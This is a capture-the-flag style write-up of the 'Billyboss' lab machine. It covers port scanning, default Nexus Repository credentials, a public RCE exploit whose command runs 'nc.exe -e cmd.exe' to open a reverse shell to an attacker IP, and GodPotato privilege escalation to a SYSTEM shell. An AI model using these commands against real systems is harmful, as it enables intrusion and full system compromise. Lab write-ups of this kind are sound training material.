##### Tags: `Nexus`  `SeImpersonatePrivilege`  `GodPotato`

# 🪟 Billyboss 🪟
## Enumeration
Nmap
```console
$ nmap -p- -T4 -sV 192.168.103.61 

PORT      STATE    SERVICE       VERSION
21/tcp    open     ftp           Microsoft ftpd
80/tcp    open     http          Microsoft IIS httpd 10.0
135/tcp   open     msrpc         Microsoft Windows RPC
139/tcp   open     netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open     microsoft-ds?
8081/tcp  open     http          Jetty 9.4.18.v20190429

Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```
port 21 ftp but anonymous login failed  
port 135,139,445 rpc and smb connection failed
port 80 is running BaGet page but nothing interested  
port 8081 is running Sonatype Nexus Repository Manager OSS 3.21.0-05  
found the default login password nexus nexus
```console
(ming㉿kali)-[/usr/share/wordlists/seclists/Passwords]
└─$ grep -r 'Sonatype Nexus'   
Default-Credentials/default-passwords.csv:Sonatype Nexus Repository Manager,admin,admin123,https://help.sonatype.com/repomanager2/maven-and-other-build-tools/sbt
Default-Credentials/default-passwords.csv:Sonatype Nexus Repository Manager,nexus,nexus,
```
logged in successfully  
there is a RCE we can use  
https://www.exploit-db.com/exploits/49385  
upload nc.exe and get the reverse shell back
```console
import sys
import base64
import requests

URL='http://192.168.103.61:8081'
CMD='nc.exe -e cmd.exe 192.168.45.152 8081'
USERNAME='nexus'
PASSWORD='nexus'
```
```console
$ penelope -p 8081         
[+] Listening for reverse shells on 0.0.0.0:8081 →  127.0.0.1 • 10.0.2.15 • 192.168.45.152
➤  🏠 Main Menu (m) 💀 Payloads (p) 🔄 Clear (Ctrl-L) 🚫 Quit (q/Ctrl-C)
[+] Got reverse shell from BILLYBOSS 192.168.103.61 Microsoft_Windows_10_Pro-x64-based_PC 👤 billyboss\nathan • Assigned SessionID <1>
[+] Added readline support...
[+] Interacting with session [1] • Shell Type Readline • Menu key Ctrl-D ⇐
[+] Logging to /home/ming/.penelope/sessions/BILLYBOSS~192.168.103.61-Microsoft_Windows_10_Pro-x64-based_PC/2026_04_02-14_33_53-809.log
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────
C:\Users\nathan\Nexus\nexus-3.21.0-05>whoami

billyboss\nathan
```
## Privilege Escalation
We have SeImpersonatePrivilege
```console
C:\Users>whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State   
============================= ========================================= ========
SeShutdownPrivilege           Shut down the system                      Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
SeUndockPrivilege             Remove computer from docking station      Disabled
SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
SeCreateGlobalPrivilege       Create global objects                     Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
SeTimeZonePrivilege           Change the time zone                      Disabled
```
upload Godpotato and nc.exe
```console
C:\Users\nathan\Downloads>GodPotato-NET4.exe -cmd "nc.exe -t -e C:\Windows\System32\cmd.exe 192.168.45.152 22"
GodPotato-NET4.exe -cmd "nc.exe -t -e C:\Windows\System32\cmd.exe 192.168.45.152 22"
[*] CombaseModule: 0x140710219218944
[*] DispatchTable: 0x140710221561440
[*] UseProtseqFunction: 0x140710220929472
[*] UseProtseqFunctionParamCount: 6
[*] HookRPC
[*] Start PipeServer
[*] Trigger RPCSS
[*] CreateNamedPipe \\.\pipe\21c86f5b-9c7e-4b26-a585-3760c86fa071\pipe\epmapper
[*] DCOM obj GUID: 00000000-0000-0000-c000-000000000046
[*] DCOM obj IPID: 00001402-0350-ffff-5fc3-b069e253a718
[*] DCOM obj OXID: 0x3337b84c9467b6e4
[*] DCOM obj OID: 0x27d51a57276b599a
[*] DCOM obj Flags: 0x281
[*] DCOM obj PublicRefs: 0x0
[*] Marshal Object bytes len: 100
[*] UnMarshal Object
[*] Pipe Connected!
[*] CurrentUser: NT AUTHORITY\NETWORK SERVICE
[*] CurrentsImpersonationLevel: Impersonation
[*] Start Search System Token
[*] PID : 832 Token:0x768  User: NT AUTHORITY\SYSTEM ImpersonationLevel: Impersonation
[*] Find System Token : True
[*] UnmarshalObject: 0x80070776
[*] CurrentUser: NT AUTHORITY\SYSTEM
[*] process start with pid 3104
```
we got a system shell
```console
$ penelope -p 22           
[+] Listening for reverse shells on 0.0.0.0:22 →  127.0.0.1 • 10.0.2.15 • 192.168.45.152
➤  🏠 Main Menu (m) 💀 Payloads (p) 🔄 Clear (Ctrl-L) 🚫 Quit (q/Ctrl-C)
[+] Got reverse shell from  192.168.103.61 WINDOWS 👤  • Assigned SessionID <1>
[+] Added readline support...
[+] Interacting with session [1] • Shell Type Readline • Menu key Ctrl-D ⇐
[+] Logging to /home/ming/.penelope/sessions/192.168.103.61-WINDOWS/2026_04_02-14_36_56-955.log
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────
C:\Windows\system32>
```
